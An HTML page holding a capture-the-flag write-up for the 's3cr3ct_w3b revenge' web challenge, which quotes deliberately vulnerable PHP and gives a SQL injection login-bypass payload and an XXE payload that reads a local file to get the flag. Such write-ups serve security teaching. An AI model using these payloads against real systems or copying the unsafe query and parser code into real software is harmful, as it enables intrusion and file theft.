@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>s3cr3ct_w3b revenge | QnQSec CTF 2025 | CTF Writeups</title>
+    <meta name="description" content="Writeup for s3cr3ct_w3b revenge challenge from QnQSec CTF 2025 - SQLi + XXE">
+    <link rel="stylesheet" href="../css/style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚩</text></svg>">
+</head>
+<body>
+    <nav>
+        <div class="container">
+            <a href="../index.html" class="logo"><span class="logo-icon">🚩</span><span>CTF Writeups</span></a>
+            <div class="nav-toggle" onclick="toggleNav()"><span></span><span></span><span></span></div>
+            <ul id="nav-menu">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../writeups.html">Writeups</a></li>
+                <li><a href="../about.html">About</a></li>
+                <li><a href="https://github.com/walidzitouni/CTFWriteups" target="_blank">GitHub</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="breadcrumbs">
+        <div class="container">
+            <a href="../index.html">Home</a><span>/</span>
+            <a href="../writeups.html">Writeups</a><span>/</span>
+            <span style="color: var(--primary-purple);">s3cr3ct_w3b revenge</span>
+        </div>
+    </div>
+
+    <article class="writeup-content">
+        <header>
+            <div class="writeup-tags" style="margin-bottom: 1rem;">
+                <span class="tag">Web</span>
+                <span class="tag">SQLi</span>
+                <span class="tag">XXE</span>
+                <span class="tag difficulty-medium">Medium</span>
+            </div>
+            <h1>s3cr3ct_w3b revenge</h1>
+            <div class="writeup-meta" style="margin-bottom: 2rem; color: var(--text-muted);">
+                <span>📅 2025</span>
+                <span style="margin: 0 1rem;">|</span>
+                <span>🏆 QnQSec CTF 2025</span>
+            </div>
+        </header>
+
+        <h2>Challenge Description</h2>
+        <blockquote>"I have hidden secret in this web can you find out the secret?"</blockquote>
+        <p>We are given a small PHP web application with a login page and an XML viewer. The Dockerfile hints that a <code>flag.txt</code> file is copied into the container.</p>
+
+        <h2>Recon &amp; Source Review</h2>
+        <h3>Login (login.php) - SQL Injection</h3>
+        <pre><code>$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";</code></pre>
+        <p>No escaping, no prepared statements → vulnerable to SQL Injection.</p>
+
+        <h3>API (api.php) - XXE</h3>
+        <pre><code>$dom->resolveExternals = true;
+$dom->substituteEntities = true;
+$dom->loadXML($xml, LIBXML_DTDLOAD | LIBXML_NOENT);
+echo $dom->saveXML();</code></pre>
+        <p>Vulnerable to XXE (XML External Entity) injection.</p>
+
+        <h3>Dockerfile</h3>
+        <pre><code>COPY flag.txt /var/flags/flag.txt</code></pre>
+        <p>Flag is at <code>/var/flags/flag.txt</code>.</p>
+
+        <h2>Step 1 — Authentication Bypass (SQLi)</h2>
+        <p>Using a simple payload in the username field:</p>
+        <pre><code>' OR '1'='1' #</code></pre>
+        <p>The query becomes:</p>
+        <pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' # ' AND password = 'x'</code></pre>
+        <p>This always returns a row, setting <code>$_SESSION['logged_in'] = true</code>. ✅ We are now authenticated.</p>
+
+        <h2>Step 2 — XXE Exploitation</h2>
+        <p>The XML parser expands external entities. We craft a malicious XML to read local files:</p>
+        <pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "file:///var/flags/flag.txt"&gt;
+]&gt;
+&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
+
+        <h2>Step 3 — Extracting the Flag</h2>
+        <p>Send a POST request to <code>/api</code> with the XML content and the flag appears in the response.</p>
+
+        <h2>Flag</h2>
+        <div class="flag-box">
+            <div class="flag-label">Flag</div>
+            <div class="flag-value">QnQSec{R3v3ng3_15_sw33t_wh3ne_d0n3_r1ght}</div>
+        </div>
+
+        <h2>Conclusion</h2>
+        <ul>
+            <li><strong>Vulnerability 1:</strong> SQL Injection in login → session bypass</li>
+            <li><strong>Vulnerability 2:</strong> XXE in XML parser → arbitrary file read</li>
+            <li><strong>Flag Path:</strong> <code>/var/flags/flag.txt</code></li>
+        </ul>
+
+        <div style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid rgba(155, 89, 182, 0.3);">
+            <a href="../writeups.html" class="btn btn-secondary">← Back to Writeups</a>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand"><a href="../index.html" class="logo"><span class="logo-icon">🚩</span><span>CTF Writeups</span></a></div>
+                <div class="footer-links"><a href="../index.html">Home</a><a href="../writeups.html">Writeups</a><a href="../about.html">About</a></div>
+            </div>
+        </div>
+    </footer>
+    <script>function toggleNav() { document.getElementById('nav-menu').classList.toggle('active'); }</script>
+</body>
+</html>
